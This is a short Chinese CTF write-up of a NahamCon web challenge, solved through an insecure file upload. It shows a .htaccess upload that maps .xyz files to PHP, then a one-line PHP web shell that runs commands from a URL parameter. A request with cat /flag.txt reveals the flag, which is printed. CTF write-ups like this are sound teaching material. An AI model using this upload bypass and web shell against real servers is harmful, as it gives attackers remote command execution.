# 题目描述

It's as easy as it looks, isn't it?

# 解决方案

题目提供了附件，其中有源码，找到[save_memories.php](file/www/save_memories.php)，打开一看，发现是文件上传，但是过滤了很多php相关的后缀，大小写绕过也不行，于是想到上传.htaccess，文件内容如下：

```
AddType application/x-httpd-php .xyz
```

然后上传文件名为shell.xyz的文件，文件内容为：

```php
<?php system($_GET['shell']);?>
```

然后访问`http://challenge.nahamcon.com:32607/shell.xyz?shell=cat%20/flag.txt`，直接拿到flag：flag{32697ad7acd2d4718758d9a5ee42965d}